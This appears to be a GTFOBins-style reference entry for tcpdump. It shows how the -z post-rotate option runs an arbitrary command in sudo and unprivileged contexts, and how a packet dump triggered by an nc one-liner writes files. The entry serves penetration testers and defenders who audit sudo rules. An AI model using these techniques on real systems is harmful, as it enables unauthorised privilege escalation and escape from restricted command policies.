---
type: gtfobin
name: tcpdump
platform: Unix
functions: [command, file-write]
tags: [gtfobin, unix, lotl]
---

# tcpdump

## command

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file
```
_This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background._
**Contexts:** sudo, unprivileged

```bash
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command
```
_This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply._
**Contexts:** sudo, unprivileged

## file-write

```bash
tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
```
_This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:

```
nc -u localhost 1 <<<DATA
```

While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device._
**Contexts:** sudo, suid, unprivileged
